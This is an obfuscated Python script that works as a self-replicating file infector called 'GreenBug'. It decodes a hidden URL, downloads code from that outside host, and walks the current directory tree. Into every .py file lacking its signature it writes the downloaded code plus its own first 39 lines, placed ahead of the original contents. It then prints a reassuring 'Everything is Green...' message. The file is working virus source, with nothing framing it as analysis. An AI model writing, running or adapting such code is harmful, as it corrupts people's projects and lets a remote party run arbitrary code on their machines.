from urllib.request import urlopen
import base64
import os
global green
_gggggg = "aHR0cHM6Ly9ncmVlbmJ1Zy5ncmVlbmJlZC5yZXBsLmNvLw=="
_ggggg = str(base64.b64decode(_gggggg))
_gggg = _ggggg.replace("b'", "")
_ggg = _gggg.replace("'", "")
_gg = urlopen(_ggg)
_g = _gg.read()
green = _g.decode("utf-8")
SIGNATURE = "//GreenBug//"
def g(gggggg):
    gg = []
    ggg = os.listdir(gggggg)
    for ggggg in ggg:
        if os.path.isdir(gggggg+"/"+ggggg):
            gg.extend(g(gggggg+"/"+ggggg))
        elif ggggg[-3:] == ".py":
            ggggggg = "gggggggggggggggggggg"
            for line in open(gggggg+"/"+ggggg):
                if SIGNATURE in line:
                    ggggggg = "ggggggggggggggggggg"
                    break
            if ggggggg == "gggggggggggggggggggg":
                gg.append(gggggg+"/"+ggggg)
    return gg
def ggggggggggggggg(gg):
    global green
    ggggggggggggg = open(os.path.abspath(__file__))
    ggggggggggg = green
    for i,gggggggggggg in enumerate(ggggggggggggg):
        if i>=0 and i <39:
            ggggggggggg += gggggggggggg
    ggggggggggggg.close
    for ggggg in gg:
        gggggggg = open(ggggg)
        gggggggggg = gggggggg.read()
        gggggggg.close()
        gggggggg = open(ggggg,"w")
        gggggggg.write(ggggggggggg + gggggggggg)
        gggggggg.close()
def GreenBug():
    print("Everything is Green...")
gg = g(os.path.abspath(""))
ggggggggggggggg(gg)
GreenBug()
